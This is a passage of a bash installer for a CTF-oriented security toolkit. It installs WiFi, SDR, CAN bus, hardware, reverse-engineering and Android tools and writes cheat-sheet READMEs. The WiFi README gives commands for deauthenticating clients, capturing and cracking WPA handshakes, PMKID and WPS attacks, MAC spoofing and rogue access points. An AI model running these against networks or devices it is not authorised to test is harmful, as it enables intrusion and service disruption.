# Kismet
if ! command_exists kismet; then
    CODENAME=$(lsb_release -cs)
    if wget -qO - https://www.kismetwireless.net/kismet-release.asc 2>/dev/null \
            | sudo gpg --dearmor | sudo tee /etc/apt/trusted.gpg.d/kismet.gpg >/dev/null; then
        echo "deb https://www.kismetwireless.net/repos/apt/release/${CODENAME} ${CODENAME} main" \
            | sudo tee /etc/apt/sources.list.d/kismet.list >/dev/null
        sudo apt update -qq
        sudo DEBIAN_FRONTEND=noninteractive apt install -y kismet 2>/dev/null \
            && sudo usermod -aG kismet "$USER" && print_status "Kismet installed" \
            || { print_warning "Kismet install failed - cleaning repo files"
                 sudo rm -f /etc/apt/sources.list.d/kismet.list \
                            /etc/apt/trusted.gpg.d/kismet.gpg; }
    fi
fi

pip_install "wifipumpkin3"

EAPHAMMER_DIR="$WIFI_DIR/eaphammer"
if [ ! -d "$EAPHAMMER_DIR" ]; then
    git_clone_tool "https://github.com/s0lst1c3/eaphammer.git" "$EAPHAMMER_DIR" "eaphammer"
    cd "$EAPHAMMER_DIR" && sudo pip3 install -r requirements.txt \
        --break-system-packages --quiet 2>/dev/null || true
fi

if command_exists go; then
    go_install "github.com/bettercap/bettercap@latest"
fi
safe_apt_install bettercap

sudo tee "$WIFI_DIR/README.md" >/dev/null << 'WIFIREADME'
# WiFi & Wireless Security Tools

## Installed via APT
- aircrack-ng: Full WiFi security auditing suite (airodump, aireplay, airmon...)
- pixiewps: WPS offline pixie dust attack
- reaver: WPS brute force
- bully: WPS attack (alternative to reaver)
- wifite: Automated multi-target WiFi attacker
- cowpatty: WPA-PSK offline cracker
- macchanger: MAC address spoofing
- hcxtools: PMKID and handshake capture/conversion
- hcxdumptool: Capture tool for PMKID/handshakes
- kismet: Multi-protocol wireless detector/sniffer

## Installed via pip/git
- wifipumpkin3: Evil AP framework
- eaphammer: Enterprise WPA EAP attacks
- bettercap: Network attack and monitoring

## Usage Examples
```bash
# Put adapter into monitor mode
sudo airmon-ng check kill
sudo airmon-ng start wlan0
# Adapter is now wlan0mon

# Discover networks
sudo airodump-ng wlan0mon

# Capture WPA handshake (target specific AP)
sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w capture wlan0mon
# (open another terminal)
sudo aireplay-ng -0 1 -a AA:BB:CC:DD:EE:FF wlan0mon  # Deauth client

# Crack WPA
aircrack-ng -w /opt/security-tools/wordlists/rockyou.txt capture-01.cap
hashcat -m 2500 capture.hccapx rockyou.txt

# PMKID attack (clientless)
sudo hcxdumptool -i wlan0mon -o dump.pcapng --enable_status=1
hcxpcapngtool -o hash.hc22000 dump.pcapng
hashcat -m 22000 hash.hc22000 rockyou.txt

# Automated
sudo wifite --kill --wpa --dict /opt/security-tools/wordlists/rockyou.txt

# WPS attack
sudo reaver -i wlan0mon -b BSSID -vv
sudo pixiewps ...  # pixie dust

# Spoof MAC
sudo macchanger -r wlan0
sudo macchanger -m AA:BB:CC:DD:EE:FF wlan0

# Kismet
kismet   # Web UI at http://localhost:2501

# Evil AP
wifipumpkin3
```

## Important Notes
- Use ONLY on networks you own or have written permission to test
- Run: sudo airmon-ng check kill (before monitor mode)
- Restore: sudo systemctl restart NetworkManager (after testing)
- Log out/in after kismet install for group permissions

## Directories
- Captures: /opt/security-tools/wifi-hacking/captures/
- Handshakes: /opt/security-tools/wifi-hacking/handshakes/
- Scripts: /opt/security-tools/wifi-hacking/scripts/
WIFIREADME
print_status "WiFi README written"

# =============================================================================
# SECTION 7: RF / SDR
# =============================================================================
print_header "RF & Software Defined Radio"
RF_DIR="$BASE/rf-sdr"

for pkg in gnuradio gqrx-sdr gr-osmosdr gr-iqbal gr-air-modes \
           rtl-sdr hackrf kalibrate-rtl multimon-ng sox audacity \
           direwolf dump1090-mutability inspectrum qsstv fldigi \
           wsjtx chirp uhd-host python3-uhd ubertooth \
           sigrok-cli pulseview libsigrok-dev libsigrokdecode-dev \
           rfkill morse2ascii; do
    safe_apt_install "$pkg"
done

pip_install "urh"

# rtl_433
if ! command_exists rtl_433; then
    if apt-cache show rtl-433 >/dev/null 2>&1; then
        safe_apt_install rtl-433
    else
        git_clone_tool "https://github.com/merbanan/rtl_433.git" "/tmp/rtl_433_build" "rtl_433"
        cd /tmp/rtl_433_build
        cmake -B build >/dev/null 2>&1 && cmake --build build >/dev/null 2>&1 \
            && sudo cmake --install build >/dev/null 2>&1 \
            && print_status "rtl_433 installed from source" \
            || print_warning "rtl_433 build failed"
        cd - >/dev/null
    fi
fi

# Mobile apps reference card
sudo tee "$RF_DIR/MOBILE_APPS_REFERENCE.md" >/dev/null << 'MOBILERF'
# RF & Wireless Mobile Apps (from CTF notes)
# For use on Android/iOS during field work and fox hunts

## Bluetooth
- nRF Connect (Nordic): BLE scanning, GATT inspection, RSSI
  Android: https://play.google.com/store/apps/details?id=no.nordicsemi.android.mcp
  iOS: https://apps.apple.com/app/nrf-connect/id1054362403
- AirGuard: AirTag/tracker detection
- Flipper app ecosystem: companion for Flipper Zero

## WiFi
- WiFi Analyzer: channel analysis, AP scanning
- WiFiman (Ubiquiti): network discovery and diagnostics
- Aruba Utilities: advanced WiFi diagnostics

## Mesh / Long Range
- Meshtastic: LoRa mesh radio (works with T-Beam/LilyGO hardware)
- goTenna: off-grid mesh messaging

## PTT / Voice
- Zello: push-to-talk radio over internet

## SDR
- SDR Touch (Android): RTL-SDR receiver on phone with OTG adapter

## Fox Hunt Workflow (from CTF notes)
1. Find active peak frequency in gqrx / URH waterfall
2. Decode Morse with multimon-ng or audacity
3. Use directional antenna + kismet/WiFiman for WiFi fox hunt
4. nRF Connect for BLE beacon hunting
5. RTL-SDR + dump1090 for aircraft/ADS-B challenges
MOBILERF

sudo tee "$RF_DIR/README.md" >/dev/null << 'RFREADME'
# RF & Software Defined Radio Tools

## Installed via APT
- gnuradio: GNU Radio SDR framework + companion GUI
- gqrx-sdr: SDR receiver GUI (RTL-SDR, HackRF, etc.)
- gr-osmosdr: Hardware support for most SDR devices
- rtl-sdr: RTL2832U USB dongle driver/tools
- hackrf: HackRF One tools (hackrf_info, hackrf_transfer...)
- kalibrate-rtl: GSM base station scanner / frequency calibration
- multimon-ng: Multi-protocol RF decoder (APRS, POCSAG, DTMF, AX25...)
- direwolf: Software TNC for APRS/packet radio
- dump1090: ADS-B decoder (aircraft tracking)
- inspectrum: Signal analysis for captured IQ files
- fldigi: Digital mode radio (PSK31, RTTY, CW, etc.)
- wsjtx: Weak-signal digital modes (FT8, JS8, JT65)
- chirp: Radio programming tool
- uhd-host: USRP SDR hardware support
- ubertooth: Bluetooth sniffing hardware support
- sigrok-cli / pulseview: Logic analyzer with protocol decoders
- audacity: Audio analysis and waveform editing
- morse2ascii: Morse code decoder

## Installed via pip
- urh: Universal Radio Hacker - signal analysis and protocol RE

## RTL-SDR Setup
```bash
# Test dongle
rtl_test
rtl_power -f 88M:108M:200k -g 50 -i 1 -e 30s fm_scan.csv

# FM radio
rtl_fm -f 99.5M -M wbfm -r 200k | aplay -r 200k -f S16_LE
gqrx  # GUI option

# Decode signals
rtl_433   # 433MHz sensors, weather stations, keyfobs
multimon-ng -t raw -a POCSAG512 -a AFSK1200 < signal.raw
```

## URH - Universal Radio Hacker
```bash
urh  # GUI - record, analyze, decode, attack
# Supports: OOK, ASK, PSK, FSK, BPSK, QAM
# Great for: car key fobs, garage doors, weather stations
```

## GNU Radio
```bash
gnuradio-companion  # Visual flow graph editor
# Build signal processing chains with drag-and-drop blocks
```

## Signal Analysis Workflow
1. gqrx / SDR# - Find signal in spectrum
2. Record IQ file: rtl_sdr -f FREQ -s RATE -g GAIN file.iq
3. inspectrum file.iq - Visual analysis
4. urh file.iq - Protocol analysis and decoding
5. multimon-ng or custom GNU Radio - Decode protocol

## ADS-B (Aircraft)
```bash
dump1090 --interactive --net
# Web interface: http://localhost:8080
```

## Morse Code (from CTF notes - THOTCON RF challenge)
```bash
# Decode from WAV file
multimon-ng -t wav -a MORSE file.wav
morse2ascii < morse_audio.txt
# Or use audacity to slow down and read manually
# Find active peak first (e.g. 99.1 MHz), then decode Morse
```

## Directories
- IQ captures: /opt/security-tools/rf-sdr/captures/
- Recordings: /opt/security-tools/rf-sdr/recordings/
- Mobile apps reference: /opt/security-tools/rf-sdr/MOBILE_APPS_REFERENCE.md
RFREADME
print_status "RF/SDR README written"

# =============================================================================
# SECTION 8: CAN BUS & AUTOMOTIVE
# =============================================================================
print_header "CAN Bus & Automotive Security"
CAN_DIR="$BASE/canbus"

for pkg in can-utils python3-can wireshark tshark socat; do
    safe_apt_install "$pkg"
done

# ICSim
ICS_DIR="$CAN_DIR/ICSim"
if [ ! -d "$ICS_DIR" ]; then
    sudo apt install -y libsdl2-dev libsdl2-image-dev 2>/dev/null || true
    git_clone_tool "https://github.com/zombieCraig/ICSim.git" "$ICS_DIR" "ICSim"
    cd "$ICS_DIR" && make 2>/dev/null \
        && print_status "ICSim built" \
        || print_warning "ICSim build failed - install libsdl2-dev"
    cd - >/dev/null
fi

# TruckDevil (from CTF notes)
TRUCKDEVIL_DIR="$CAN_DIR/TruckDevil"
if [ ! -d "$TRUCKDEVIL_DIR" ]; then
    git_clone_tool "https://github.com/LittleBlondeDevil/TruckDevil.git" \
        "$TRUCKDEVIL_DIR" "TruckDevil"
    cd "$TRUCKDEVIL_DIR" && sudo pip3 install -r requirements.txt \
        --break-system-packages --quiet 2>/dev/null || true
    sudo tee /usr/local/bin/truckdevil >/dev/null << 'EOF'
#!/bin/bash
cd /opt/security-tools/canbus/TruckDevil && python3 truckdevil.py "$@"
EOF
    sudo chmod +x /usr/local/bin/truckdevil
fi

# CaringCaribou
CARINGCARIBOU_DIR="$CAN_DIR/caringcaribou"
if [ ! -d "$CARINGCARIBOU_DIR" ]; then
    git_clone_tool "https://github.com/CaringCaribou/caringcaribou.git" \
        "$CARINGCARIBOU_DIR" "caringcaribou"
    pip_install "caringcaribou"
    sudo tee /usr/local/bin/cc >/dev/null << 'EOF'
#!/bin/bash
python3 /opt/security-tools/canbus/caringcaribou/caringcaribou.py "$@"
EOF
    sudo chmod +x /usr/local/bin/cc
fi

git_clone_tool "https://github.com/zombieCraig/UDSim.git" "$CAN_DIR/UDSim" "UDSim"
git_clone_tool "https://github.com/zombieCraig/c0f.git"   "$CAN_DIR/c0f"   "c0f"

pip_install "canmatrix"
pip_install "python-can"
pip_install "cantools"
pip_install "scapy"

# CAN setup helper
sudo tee /usr/local/bin/can-setup >/dev/null << 'CANSETUP'
#!/bin/bash
echo "═══ CAN Bus Interface Setup Guide ═══"
echo ""
echo "── Virtual CAN (testing without hardware) ──"
echo "  sudo modprobe vcan"
echo "  sudo ip link add dev vcan0 type vcan"
echo "  sudo ip link set up vcan0"
echo ""
echo "── Real CAN Interface ──"
echo "  sudo ip link set can0 up type can bitrate 500000"
echo "  sudo ip link set can0 up type can bitrate 250000"
echo ""
echo "── Basic can-utils Commands ──"
echo "  candump vcan0                       Sniff all frames"
echo "  candump -l vcan0                    Log to file"
echo "  cansend vcan0 123#DEADBEEF          Send a frame"
echo "  cangen vcan0 -g 10 -I 200 -L 8     Generate random frames"
echo "  cansniffer vcan0                    Live sniffer with filter"
echo "  canplayer -I logfile.log            Replay captured log"
echo "  canbusload vcan0@500000             Show bus load %"
echo ""
echo "── ICSim Dashboard Simulator ──"
echo "  cd /opt/security-tools/canbus/ICSim"
echo "  ./icsim vcan0 &"
echo "  ./controls vcan0"
echo ""
echo "── TruckDevil (J1939) ──"
echo "  truckdevil -i can0 -s 500000"
echo ""
echo "── CaringCaribou (UDS/CAN scanner) ──"
echo "  cc discovery -h"
echo "  cc uds discovery -h"
echo "  cc xcp info -h"
echo ""
echo "── Python-can snippet ──"
echo "  import can"
echo "  bus = can.interface.Bus(channel='can0', bustype='socketcan')"
echo "  msg = can.Message(arbitration_id=0x123, data=[0xDE,0xAD,0xBE,0xEF])"
echo "  bus.send(msg)"
CANSETUP
sudo chmod +x /usr/local/bin/can-setup

sudo tee "$CAN_DIR/README.md" >/dev/null << 'CANREADME'
# CAN Bus & Automotive Security Tools

## Installed via APT
- can-utils: candump, cansend, cansniffer, cangen, canplayer, canbusload...
- python3-can: Python CAN interface library

## Installed via Git
- ICSim: CAN dashboard simulator for learning/CTF
- TruckDevil: J1939 heavy truck protocol hacking (truckdevil command)
- caringcaribou: UDS/CAN scanner and attack tool (cc command)
- UDSim: UDS ECU simulator
- c0f: CAN bus fingerprinting

## Installed via pip
- canmatrix: DBC/KCD/SYM file handling and conversion
- python-can: Python CAN bus interface
- cantools: DBC file decoder and encoder
- scapy: Packet manipulation with CAN support

## Quick Start
```bash
# View this guide
can-setup

# Set up virtual CAN for testing (no hardware needed)
sudo modprobe vcan
sudo ip link add dev vcan0 type vcan
sudo ip link set up vcan0

# Two terminals:
candump vcan0                          # Terminal 1: watch
cansend vcan0 123#DEADBEEF            # Terminal 2: send

# Run ICSim dashboard (great for learning)
cd /opt/security-tools/canbus/ICSim
./icsim vcan0 &       # Dashboard
./controls vcan0      # Controller

# UDS scanning
cc discovery -h
cc uds discovery -i can0

# J1939 trucks
truckdevil -i can0 -s 500000
```

## DBC Files
```bash
# Decode CAN traffic using a DBC file
cantools decode signals.dbc < candump.log
cantools plot signals.dbc < candump.log  # Plot signal values
python3 -c "
import cantools, can
db = cantools.database.load_file('signals.dbc')
msg = db.get_message_by_name('EngineData')
print(msg.decode(bytes.fromhex('DEADBEEF01020304')))
"
```

## Wireshark CAN
```bash
# Capture and analyze
candump -l can0           # Log to file
wireshark candump.log     # Open in Wireshark
# Filter: can.id == 0x123
```

## References (from CTF notes)
- https://github.com/LittleBlondeDevil/TruckDevil
- https://github.com/iDoka/awesome-canbus
- https://python-can.readthedocs.io/en/stable/

## Directories
- Captures: /opt/security-tools/canbus/captures/
- Scripts: /opt/security-tools/canbus/scripts/
CANREADME
print_status "CAN bus README written"

# =============================================================================
# SECTION 9: HARDWARE & EMBEDDED
# =============================================================================
print_header "Hardware & Embedded Security"
HW_DIR="$BASE/hardware-embedded"

for pkg in esptool avrdude openocd flashrom picocom minicom screen \
           putty cutecom gtkterm sigrok-cli pulseview \
           i2c-tools python3-smbus libi2c-dev \
           usbutils libusb-1.0-0-dev libftdi1-dev libftdi1-2 \
           libhidapi-dev binwalk firmware-mod-kit \
           mtd-utils gzip bzip2 arj lhasa cabextract \
           cramfsprogs squashfs-tools; do
    safe_apt_install "$pkg"
done

pip_install "esptool"
pip_install "baudrate"
pip_install "jefferson"
pip_install "binwalk"

# Arduino CLI
if ! command_exists arduino-cli; then
    curl -fsSL https://raw.githubusercontent.com/arduino/arduino-cli/master/install.sh \
        | BINDIR=/usr/local/bin sudo sh 2>/dev/null \
        && print_status "Arduino CLI installed" \
        || print_warning "Arduino CLI failed - https://arduino.cc/en/software"
fi
pip_install "platformio"

git_clone_tool "https://github.com/cyphunk/JTAGenum.git" \
    "$HW_DIR/jtag-swd/JTAGenum" "JTAGenum"
git_clone_tool "https://github.com/craigz28/firmwalker.git" \
    "$HW_DIR/firmware/firmwalker" "firmwalker"
git_clone_tool "https://github.com/attify/firmware-analysis-toolkit.git" \
    "$HW_DIR/firmware/fat" "firmware-analysis-toolkit"
git_clone_tool "https://github.com/BusPirate/Bus_Pirate.git" \
    "$HW_DIR/buspirate" "Bus Pirate scripts"

# ESP32 dump helper (from CTF notes)
sudo tee /usr/local/bin/esp32-dump >/dev/null << 'ESP32DUMP'
#!/bin/bash
# ESP32 Flash Dump Helper - from CTF hardware notes
PORT="${1:-/dev/ttyUSB0}"
BAUD="${2:-115200}"
OUT="${3:-flashdump.bin}"
echo "[*] Dumping 4MB flash from $PORT at $BAUD baud -> $OUT"
echo "[*] Common baud rates: 9600 1200 2400 4800 19200 38400 57600 115200"
echo ""
echo "[*] Available ports:"
ls /dev/tty* 2>/dev/null | grep -E "USB|ACM|S[0-9]"
echo ""
python3 -m esptool --port "$PORT" -b "$BAUD" read_flash 0 0x400000 "$OUT" \
    && echo "[+] Done: $OUT" \
    && echo "[*] Next: strings $OUT | grep -i flag" \
    && echo "[*] Next: binwalk -e $OUT" \
    || echo "[-] Failed - try a different baud rate or port"
ESP32DUMP
sudo chmod +x /usr/local/bin/esp32-dump

sudo tee /usr/local/bin/serial-connect >/dev/null << 'SERIALCON'
#!/bin/bash
PORT="${1:-/dev/ttyUSB0}"
BAUD="${2:-115200}"
echo "[*] Connecting to $PORT at $BAUD baud"
echo "[*] Common baud rates: 9600 115200 57600 38400 19200 4800 1200"
echo "[*] Find ports: lsusb && ls /dev/tty*"
echo "[*] Exit: Ctrl+A then Ctrl+X"
picocom "$PORT" -b "$BAUD"
SERIALCON
sudo chmod +x /usr/local/bin/serial-connect

# I2C decoder (from CTF logic analyzer notes)
sudo tee /usr/local/bin/i2c-decode >/dev/null << 'I2CDECODE'
#!/bin/bash
# I2C Hex to ASCII decoder - from CTF logic analyzer notes
# Example: i2c-decode '42 44 47 49 49 4D 4F 3F'
# -> BDGIIMO?
echo "I2C Data Decoder"
echo "================"
if [ -n "$1" ]; then
    echo "Input:  $1"
    echo -n "ASCII:  "
    echo "$1" | tr ' ' '\n' | while read -r hex; do
        [ -n "$hex" ] && printf "\\x$hex"
    done
    echo ""
else
    echo "Usage: i2c-decode '42 44 47 49 49 4D 4F 3F'"
    echo ""
    echo "CTF examples from logic analyzer capture:"
    echo "  Write: 42 44 47 49 49 4D 4F 3F -> BDGIIMO?"
    echo "  Read:  4B 4B 55 78 36 76 73 30 -> KKUx6vs0"
fi
I2CDECODE
sudo chmod +x /usr/local/bin/i2c-decode

sudo tee "$HW_DIR/README.md" >/dev/null << 'HWREADME'
# Hardware & Embedded Security Tools

## Installed via APT
- esptool: ESP8266/ESP32 firmware dump/flash tool
- avrdude: AVR microcontroller programmer
- openocd: JTAG/SWD debugging interface
- flashrom: Flash chip read/write (SPI, I2C, LPC, FWH...)
- picocom: Minimal serial terminal
- minicom: Full-featured serial terminal with menus
- screen: Serial terminal (also general multiplexer)
- putty: GUI serial/SSH/Telnet terminal
- cutecom / gtkterm: GUI serial terminals
- sigrok-cli / pulseview: Logic analyzer (any sigrok-compatible hardware)
- i2c-tools: i2cdetect, i2cdump, i2cget, i2cset
- binwalk: Firmware analysis and extraction
- arduino-cli: Arduino compile/upload from command line
- platformio: Cross-platform embedded development

## Installed via Git
- JTAGenum: Arduino sketch to enumerate JTAG/SWD pins
- firmwalker: Firmware filesystem string/credential scanner
- firmware-analysis-toolkit: QEMU-based firmware emulation

## Custom Helper Scripts
```bash
esp32-dump [port] [baud] [output]     # Dump ESP32/ESP8266 flash
serial-connect [port] [baud]          # Quick picocom serial connect
i2c-decode '42 44 47 FF'              # Decode I2C hex bytes to ASCII
can-setup                             # CAN interface guide
```

## ESP32/ESP8266 Workflow (from CTF notes)
```bash
# Find connected device
lsusb
ls /dev/tty*

# Dump 4MB flash
esp32-dump /dev/ttyUSB0 115200 flashdump.bin
# or manually:
python3 -m esptool --port /dev/ttyUSB0 -b 115200 read_flash 0 0x400000 flashdump.bin
python3 -m esptool --port /dev/ttyUSB0 -b 9600   read_flash 0 0x400000 flashdump.bin

# Analyze dump
strings flashdump.bin | grep -i flag
binwalk flashdump.bin
binwalk -e flashdump.bin    # Extract embedded filesystems
ghidra flashdump.bin        # Reverse engineer code sections
strings flashdump.bin       # All printable strings

# Serial terminal
picocom /dev/ttyUSB0 -b 115200
picocom /dev/ttyUSB0 -b 9600
# Exit: Ctrl+A then Ctrl+X

# Common baud rates to try: 9600 115200 57600 38400 19200 4800 1200
```

## Logic Analyzer I2C Decode (from CTF notes)
```bash
# Decode I2C captured hex bytes to ASCII characters
i2c-decode '42 44 47 49 49 4D 4F 3F'
# Output: BDGIIMO?

i2c-decode '4B 4B 55 78 36 76 73 30'
# Output: KKUx6vs0

# Using sigrok
sigrok-cli -d fx2lafw --samples 1M -o capture.sr
sigrok-cli -i capture.sr -P i2c:sda=D0:scl=D1 --protocol-decoder-samplenum
pulseview  # GUI with same decoders
```

## JTAG/SWD
```bash
openocd -f interface/stlink.cfg -f target/stm32f1x.cfg
# JTAGenum: Upload to Arduino, then run scan to find JTAG pins
```

## Flash Chip
```bash
flashrom -p ch341a_spi -r backup.bin    # Read flash with CH341A
flashrom -p ch341a_spi -w firmware.bin  # Write flash
```

## Firmware Analysis
```bash
binwalk firmware.bin                    # Identify structures
binwalk -e firmware.bin                 # Extract everything
cd firmware.bin.extracted/
bash /opt/security-tools/hardware-embedded/firmware/firmwalker/firmwalker.sh ./
# Finds: passwords, keys, SSH keys, SSL certs, web interfaces...
```

## Directories
- Firmware dumps: /opt/security-tools/hardware-embedded/firmware/
- CAN logs: /opt/security-tools/hardware-embedded/can-logs/
- Serial logs: /opt/security-tools/hardware-embedded/serial-logs/
- JTAG/SWD: /opt/security-tools/hardware-embedded/jtag-swd/
- SDR captures: /opt/security-tools/hardware-embedded/sdr-captures/
HWREADME
print_status "Hardware/Embedded README written"

# =============================================================================
# SECTION 10: REVERSE ENGINEERING
# =============================================================================
print_header "Reverse Engineering"
RE_DIR="$BASE/reverse-engineering"
BIN_DIR="$BASE/binary-analysis"

for pkg in radare2 rizin binwalk binutils gdb gdb-multiarch nasm \
           clang llvm ltrace strace hexedit bless \
           dex2jar apktool edb-debugger upx-ucl; do
    safe_apt_install "$pkg"
done
sudo apt install -y vim-common 2>/dev/null || true  # for xxd

# JADX
if ! command_exists jadx; then
    JADX_VERSION=$(curl -sf "https://api.github.com/repos/skylot/jadx/releases/latest" \
        | grep -Po '"tag_name":\s*"v\K[0-9.]+' 2>/dev/null || echo "1.5.0")
    TMP_ZIP=$(mktemp /tmp/jadx-XXXXXX.zip)
    TMP_DIR=$(mktemp -d /tmp/jadx-XXXXXX)
    if curl -fL "https://github.com/skylot/jadx/releases/download/v${JADX_VERSION}/jadx-${JADX_VERSION}.zip" \
            -o "$TMP_ZIP" 2>/dev/null; then
        unzip -q "$TMP_ZIP" -d "$TMP_DIR"
        sudo mkdir -p /opt/jadx/bin /opt/jadx/lib
        sudo cp "$TMP_DIR/bin/jadx" "$TMP_DIR/bin/jadx-gui" /opt/jadx/bin/
        sudo cp "$TMP_DIR/lib/"* /opt/jadx/lib/
        sudo chmod +x /opt/jadx/bin/jadx /opt/jadx/bin/jadx-gui
        sudo ln -sf /opt/jadx/bin/jadx /usr/local/bin/jadx
        sudo ln -sf /opt/jadx/bin/jadx-gui /usr/local/bin/jadx-gui
        echo 'export PATH=$PATH:/opt/jadx/bin' | sudo tee /etc/profile.d/jadx.sh >/dev/null
        print_status "JADX v${JADX_VERSION} installed"
        ((INSTALLED++))
    else
        print_warning "JADX download failed"; ((FAILED++))
    fi
    rm -rf "$TMP_ZIP" "$TMP_DIR"
fi

# ImHex
github_deb_install "WerWolv/ImHex" "Ubuntu-24\.04.*\.deb$|Ubuntu.*24.*\.deb$" "ImHex"
safe_apt_install rizin-cutter

# Python RE libraries
for p in angr capstone keystone-engine unicorn ROPgadget frida-tools frida \
         pefile lief r2pipe volatility3; do
    pip_install "$p"
done

# pwndbg
PWNDBG_DIR="$RE_DIR/pwndbg"
if [ ! -d "$PWNDBG_DIR" ]; then
    git_clone_tool "https://github.com/pwndbg/pwndbg.git" "$PWNDBG_DIR" "pwndbg"
    cd "$PWNDBG_DIR" && sudo ./setup.sh 2>/dev/null \
        && print_status "pwndbg setup complete" \
        || print_warning "pwndbg setup failed - run manually"
    cd - >/dev/null
fi

# Bytecode Viewer
BCV_JAR="$RE_DIR/bytecode-viewer.jar"
if [ ! -f "$BCV_JAR" ]; then
    BCV_URL=$(curl -sf "https://api.github.com/repos/Konloch/bytecode-viewer/releases/latest" \
        | grep -Po '"browser_download_url":\s*"\K[^"]+\.jar' | head -1)
    [ -n "$BCV_URL" ] && sudo wget -qO "$BCV_JAR" "$BCV_URL" \
        && print_status "Bytecode Viewer downloaded" \
        || print_warning "Bytecode Viewer download failed"
fi

# Ghidra via snap
if ! snap list 2>/dev/null | grep -q ghidra && ! command_exists ghidra; then
    sudo snap install ghidra 2>/dev/null \
        || print_warning "Ghidra snap failed - https://ghidra-sre.org/"
fi

# CyberChef launcher
sudo tee /usr/local/bin/cyberchef >/dev/null << 'EOF'
#!/bin/bash
echo "[*] CyberChef: https://gchq.github.io/CyberChef/"
python3 -m webbrowser "https://gchq.github.io/CyberChef/" 2>/dev/null \
    || xdg-open "https://gchq.github.io/CyberChef/" 2>/dev/null \
    || echo "Open: https://gchq.github.io/CyberChef/"
EOF
sudo chmod +x /usr/local/bin/cyberchef

# Download test APK for JADX
TEST_APK="$BIN_DIR/test.apk"
[ ! -f "$TEST_APK" ] && sudo curl -so "$TEST_APK" \
    https://raw.githubusercontent.com/appium-boneyard/sign/master/tests/assets/tiny.apk \
    2>/dev/null && print_status "Test APK downloaded"

sudo tee "$BIN_DIR/README.md" >/dev/null << 'BINREADME'
# Binary Analysis & Reverse Engineering Tools

## Core Analysis Tools
- JADX v1.5+ ⭐ MOST IMPORTANT for Android/Java RE
  - jadx app.apk              (command line - decompiles to Java)
  - jadx-gui                  (graphical interface)
  - jadx /opt/security-tools/binary-analysis/test.apk  (test it)
- Ghidra: NSA's full reverse engineering suite (via snap)
- radare2: Advanced CLI RE framework (r2 is cool!)
  - r2 binary                 (open binary)
  - r2 -A binary              (auto-analyze on load)
- rizin: r2 fork with improved UX
- rizin-cutter: GUI frontend for rizin
- edb-debugger: Linux GUI debugger (like OllyDbg)

## Hex Editors
- imhex: Modern hex editor with pattern language
- bless: GTK hex editor
- hexedit: Console hex editor
- xxd / ghex: Hex dump utilities

## Decompilers / Disassemblers
- jadx: Java/Android (APK, DEX, AAR, JAR)
- dex2jar: Android DEX to JAR converter
- apktool: APK decompile/recompile (smali)
- bytecode-viewer.jar: Multi-decompiler Java viewer
  (java -jar /opt/security-tools/reverse-engineering/bytecode-viewer.jar)

## Debuggers
- gdb + GEF: GNU debugger with GEF extensions loaded
- pwndbg: GDB plugin for exploit dev (in /reverse-engineering/pwndbg/)
- gdb-multiarch: Debug ARM, MIPS, PPC binaries on x86
- strace: System call tracer
- ltrace: Library call tracer

## Python Libraries
- angr: Binary analysis framework (symbolic execution, CFG)
- capstone: Disassembly engine
- keystone-engine: Assembler engine
- unicorn: CPU emulator engine
- ROPgadget: ROP chain gadget finder
- frida / frida-tools: Dynamic instrumentation
- pefile: PE file parser
- lief: Binary format analysis (ELF, PE, Mach-O)
- r2pipe: radare2 scripting interface
- volatility3: Memory forensics

## Static Analysis Commands
```bash
file binary                    # Identify file type
strings -a binary              # Extract printable strings
strings binary | grep -i flag  # Quick CTF check
xxd binary | head -50          # Hex dump
hexdump -C binary | head -50   # Canonical hex dump
objdump -d binary              # Disassemble
readelf -a binary              # ELF info
nm binary                      # Symbol table
checksec binary                # Security flags (NX, PIE, RELRO, canary)
```

## Android Analysis Workflow
```bash
# 1. Get APK
adb pull /data/app/com.example.app/base.apk app.apk

# 2. Static analysis ⭐
jadx app.apk              # Decompile to Java
jadx-gui                  # GUI analysis

# 3. Quick checks
file app.apk
unzip app.apk -d extracted/
strings extracted/classes.dex | grep -i "password\|secret\|api_key\|token"

# 4. Dynamic analysis
frida -U -f com.example.app --no-pause   # Hook on launch
frida-ps -U                               # List processes
objection -g com.example.app explore     # Frida wrapper

# 5. Test JADX
jadx /opt/security-tools/binary-analysis/test.apk
```

## radare2 Quick Reference
```bash
r2 binary          # Open
aaa                # Auto-analyze
afl                # List functions
pdf @ main         # Disassemble main
VV                 # Visual call graph
/flag              # Search for string "flag"
q                  # Quit
```

## Directories
- Samples: /opt/security-tools/binary-analysis/samples/
- Scripts: /opt/security-tools/binary-analysis/scripts/
- Reports: /opt/security-tools/binary-analysis/reports/
- Android: /opt/security-tools/binary-analysis/android/
- CyberChef: run 'cyberchef' command
BINREADME
print_status "Binary analysis README written"

# =============================================================================
# SECTION 11: ANDROID / MOBILE
# =============================================================================
print_header "Android & Mobile Security"
ANDROID_DIR="$BIN_DIR/android"

for pkg in adb fastboot android-sdk-platform-tools-common apksigner; do
    safe_apt_install "$pkg"
done

if ! snap list 2>/dev/null | grep -q android-studio; then
    sudo snap install android-studio --classic 2>/dev/null \
        || print_warning "Android Studio snap failed - https://developer.android.com/studio"
fi

for p in "frida-tools" "frida" "objection" "apkleaks" "mobsfscan"; do
    pip_install "$p"
done

# MobSF
MOBSF_DIR="$ANDROID_DIR/MobSF"
if [ ! -d "$MOBSF_DIR" ]; then
    git_clone_tool "https://github.com/MobSF/Mobile-Security-Framework-MobSF.git" \
        "$MOBSF_DIR" "MobSF"
    cd "$MOBSF_DIR" && sudo pip3 install -r requirements.txt \
        --break-system-packages --quiet 2>/dev/null || true
    sudo tee /usr/local/bin/mobsf >/dev/null << 'EOF'
#!/bin/bash
cd /opt/security-tools/binary-analysis/android/MobSF
echo "[*] MobSF Web UI: http://127.0.0.1:8000"
python3 manage.py runserver 127.0.0.1:8000
EOF
    sudo chmod +x /usr/local/bin/mobsf
fi

# Frida server helper
sudo tee /usr/local/bin/frida-server-android >/dev/null << 'FRIDA_SCRIPT'
#!/bin/bash
ARCH="${1:-arm64}"
FRIDA_VERSION=$(frida --version 2>/dev/null | tr -d '[:space:]' || echo "16.1.4")
OUTDIR="/opt/security-tools/mitm-interception/frida"
mkdir -p "$OUTDIR"
URL="https://github.com/frida/frida/releases/download/${FRIDA_VERSION}/frida-server-${FRIDA_VERSION}-android-${ARCH}.xz"
echo "[*] Downloading frida-server v${FRIDA_VERSION} for ${ARCH}..."
wget -P "$OUTDIR" "$URL" 2>/dev/null \
    && xz -d "${OUTDIR}/frida-server-${FRIDA_VERSION}-android-${ARCH}.xz" \
    && chmod +x "${OUTDIR}/frida-server-${FRIDA_VERSION}-android-${ARCH}" \
